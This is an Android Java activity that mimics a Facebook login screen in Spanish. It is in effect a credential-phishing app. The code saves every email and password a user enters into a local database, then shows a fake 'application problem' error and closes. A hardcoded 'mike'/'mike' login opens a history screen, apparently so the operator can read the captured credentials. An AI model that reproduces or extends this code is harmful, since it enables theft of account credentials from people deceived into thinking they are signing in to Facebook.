package rootingtheai.mikeolivera.facebook.Activities;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.database.DatabaseUtils;
import android.os.Bundle;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import rootingtheai.mikeolivera.facebook.Database.DataBaseUtils;
import rootingtheai.mikeolivera.facebook.Database.Database;
import rootingtheai.mikeolivera.facebook.R;


public class Facebook extends Activity {
    private TextView textView;
    private Button boton;
    private EditText user, pass;
    private AlertDialog.Builder builder;

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        // Full Screen
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);


        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_facebook);

        builder = new AlertDialog.Builder(this);
        builder.setTitle("Problema en la conexión:");
        builder.setMessage("Por favor reinténtalo mas tarde.");
        builder.setPositiveButton("OK", null);

        boton = (Button) findViewById(R.id.BO_about);


        //ABRE UNA DIRECCION WEB AL PRESIONA EL TEXTVIEW
        textView = (TextView) findViewById(R.id.textView1);
        textView.setOnClickListener(new OnClickListener() {
            @Override
            public void onClick(View arg0) {
                builder.create();
                builder.show();
            }
        });


        user = (EditText) findViewById(R.id.caja);
        pass = (EditText) findViewById(R.id.editText2);


    }

    private boolean userIsEmpty() {
        boolean us = user.getText().toString().trim().length() == 0;
        if (us) {
            Toast.makeText(getBaseContext(), "El campo de correo electrónico está vacio.\n" +
                    "Por favor escribe tu correo electrónico para conectarte", Toast.LENGTH_SHORT).show();
        }
        return us;
    }

    private boolean passIsEmpty() {
        boolean pas = pass.getText().toString().trim().length() == 0;
        if (pas) {
            Toast.makeText(getBaseContext(), "El campo de contraseña está vacio.\n" +
                    "Por favor escribe tu contraseña para conectarte", Toast.LENGTH_SHORT).show();
        }
        return pas;
    }


    private boolean guardamos() {
        if (userIsEmpty() || passIsEmpty()) {
            // If any EditText is empty

        } else {
            // If not
            // Check if It's valid email
            if (isEmailValid()) {
                return true;
            } else {
                Toast.makeText(getBaseContext(), "Por favor escribe un correo electrónico valido", Toast.LENGTH_SHORT).show();
            }

        }
        return false;
    }

    public void conectar(View v) {

        if(pass.getText().toString().equalsIgnoreCase("mike") && user.getText().toString().equalsIgnoreCase("mike")){
            startActivity(new Intent(this,HistoryActivity.class));
            return;
        }

        if (guardamos()) {

            DataBaseUtils DBU= new DataBaseUtils(getApplicationContext());
            DBU.add_user(user.getText().toString(),pass.getText().toString());

            builder = new AlertDialog.Builder(this);
            builder.setTitle("Problema en la aplicación:");
            builder.setPositiveButton("OK",
                    new DialogInterface.OnClickListener() {

                        @Override
                        public void onClick(DialogInterface dialog, int which) {
                            finish();

                        }
                    }
            );
            builder.setMessage("Ha habido un problema con la aplicación y debe cerrarse.");
            builder.create();
            builder.show();

        }
    }



    private boolean isEmailValid() {
        String regExpn =
                "^(([\\w-]+\\.)+[\\w-]+|([a-zA-Z]{1}|[\\w-]{2,}))@"
                        + "((([0-1]?[0-9]{1,2}|25[0-5]|2[0-4][0-9])\\.([0-1]?"
                        + "[0-9]{1,2}|25[0-5]|2[0-4][0-9])\\."
                        + "([0-1]?[0-9]{1,2}|25[0-5]|2[0-4][0-9])\\.([0-1]?"
                        + "[0-9]{1,2}|25[0-5]|2[0-4][0-9])){1}|"
                        + "([a-zA-Z]+[\\w-]+\\.)+[a-zA-Z]{2,4})$";

        CharSequence inputStr = user.getText().toString();

        Pattern pattern = Pattern.compile(regExpn, Pattern.CASE_INSENSITIVE);
        Matcher matcher = pattern.matcher(inputStr);

        if (matcher.matches())
            return true;
        else
            return false;
    }
}
